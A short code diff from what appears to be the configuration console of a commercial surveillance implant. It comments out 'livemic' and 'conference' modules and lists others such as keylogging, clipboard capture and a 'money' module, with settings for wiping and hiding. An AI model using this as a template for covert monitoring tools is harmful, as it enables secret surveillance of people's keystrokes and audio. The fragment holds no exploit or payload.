@@ -58,7 +58,7 @@ package it.ht.rcs.console
 
 				{module: "clipboard", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,android"},
 
-				{module: "conference", number: "", _type: "mobile", _platform: "winmo"},
+				//{module: "conference", number: "", _type: "mobile", _platform: "winmo"},
 
 				{module: "crisis", network: {enabled: false, processes: []}, hook: {enabled: true, processes: []},
 
@@ -72,7 +72,7 @@ package it.ht.rcs.console
 
 				{module: "keylog", _type: "desktop,mobile", _platform: "windows,osx,ios,linux"},
 
-				{module: "livemic", number: "", _type: "mobile", _platform: "winmo"},
+				//{module: "livemic", number: "", _type: "mobile", _platform: "winmo"},
         
         {module: "money", _type: "desktop", _platform: "windows,osx,linux"},
 
@@ -123,7 +123,6 @@ package it.ht.rcs.console
 			var min:Number=agent.type == 'desktop' ? 1000 * Size.MIB : 0.1 * Size.MIB; // 1 GB, 100 MB
 			var max:Number=agent.type == 'desktop' ? 4000 * Size.MIB : 100 * Size.MIB; // 4 GB, 100 MB
 			var globals:Object={quota: {min: min, max: max}, wipe: false, remove_driver: true, nohide: [], type: agent.type, advanced: false, collapsed: false, migrated: false, version: 2012041601};
-
 			return globals;
 
 		}
